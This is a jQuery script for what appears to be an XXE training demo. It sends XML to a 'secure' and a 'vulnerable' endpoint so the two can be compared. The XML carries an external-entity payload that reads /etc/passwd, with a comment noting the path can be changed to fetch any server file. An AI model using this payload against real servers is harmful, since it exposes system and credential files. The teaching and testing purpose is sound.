
(function ($) {

	let $window = $(window),
		$body = $('body');

	// Breakpoints.
	breakpoints({
		default: ['1681px', null],
		xlarge: ['1281px', '1680px'],
		large: ['981px', '1280px'],
		medium: ['737px', '980px'],
		small: ['481px', '736px'],
		xsmall: ['361px', '480px'],
		xxsmall: [null, '360px']
	});

	// Play initial animations on page load.
	$window.on('load', function () {
		window.setTimeout(function () {
			$body.removeClass('is-preload');
		}, 100);
	});

	// Menu.
	$('#menu')
		.append('<a href="#menu" class="close"></a>')
		.appendTo($body)
		.panel({
			target: $body,
			visibleClass: 'is-menu-visible',
			delay: 500,
			hideOnClick: true,
			hideOnSwipe: true,
			resetScroll: true,
			resetForms: true,
			side: 'left'
		});


	/*
	Get the CSRF token from the metadata (Thymeleaf content) and send it as the
	X-CSRF header, otherwise the response will be 403 Forbidden
	*/
	var token = $("meta[name='_csrf']").attr("content");
	// In case you change the default CSRF header name
	// var header_at = $("meta[name='_csrf_header']").attr("content");

	/*
	XML data to POST
	In the 3rd line you can edit the file URL to fetch any file
	on the server.
	 */

	var data_in= "<?xml version=\"1.0\" encoding=\"utf-8\"?>\n" +
		"<!DOCTYPE foo [ \n" +
		"<!ENTITY xxe SYSTEM \"file:///etc/passwd\"> ]>\n" +
		"<Employees>\n" +
		"    <Employee ID=\"1\">\n" +
		"        <Firstname>";

	var data_in2="</Firstname>\n" +
		"        <Lastname>James</Lastname>\n" +
		"        <Age>30</Age>\n" +
		"        <Salary>2500</Salary>\n" +
		"    </Employee>\n" +
		"    <Employee ID=\"2\">\n" +
		"        <Firstname>Anthony</Firstname>\n" +
		"        <Lastname>Davis</Lastname>\n" +
		"        <Age>22</Age>\n" +
		"        <Salary>1500</Salary>\n" +
		"    </Employee>\n" +
		"    <Employee ID=\"3\">\n" +
		"        <Firstname>Paul</Firstname>\n" +
		"        <Lastname>George</Lastname>\n" +
		"        <Age>24</Age>\n" +
		"        <Salary>2000</Salary>\n" +
		"    </Employee>\n" +
		"    <Employee ID=\"4\">\n" +
		"        <Firstname>Blake</Firstname>\n" +
		"        <Lastname>Griffin</Lastname>\n" +
		"        <Age>25</Age>\n" +
		"        <Salary>2250</Salary>\n" +
		"    </Employee>\n" +
		"</Employees>";

	$("#secure_button").click(function(){
		$.ajax({
			type: "POST",
			url: "/xxe-interface/restSecure",
			data: data_in,
			contentType: 'application/xml',
			headers: {
				"X-CSRF-TOKEN" : token,
			},
			success: function(result){
				$("#output").html(result);
			}
		});
	});
	$("#vuln_button").click(function(){
		$.ajax({
			type: "POST",
			url: "/xxe-interface/restVulnerable",
			data: data_in+document.getElementById('postid').value+data_in2,
			contentType: 'application/xml',
			headers: {
				"X-CSRF-TOKEN" : token,
			},
			success: function(result){
				$("#output").html(result);
			}
		});
	});
})(jQuery);


/*
(function ($) {
    "use strict";
    /*==================================================================
    [ Validate ]
var input = $('.validate-input .input100');


$('.validate-form').on('submit',function(){
	var check = true;

	for(var i=0; i<input.length; i++) {
		if(validate(input[i]) == false){
			showValidate(input[i]);
			check=false;
		}
	}

	return check;
});

/*
$('.validate-form .input100').each(function(){
	$(this).focus(function(){
		hideValidate(this);
	});
});

function validate (input) {
	if($(input).attr('type') == 'email' || $(input).attr('name') == 'username') {
		if($(input).val().trim().match(/^([a-zA-Z0-9_\-\.]+)@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.)|(([a-zA-Z0-9\-]+\.)+))([a-zA-Z]{1,5}|[0-9]{1,3})(\]?)$/) == null) {
			return false;
		}
	}
	else {
		if($(input).val().trim() == ''){
			return false;
		}
	}
}

function showValidate(input) {
	var thisAlert = $(input).parent();

	$(thisAlert).addClass('alert-validate');
}

function hideValidate(input) {
	var thisAlert = $(input).parent();

	$(thisAlert).removeClass('alert-validate');
}
})(jQuery);*/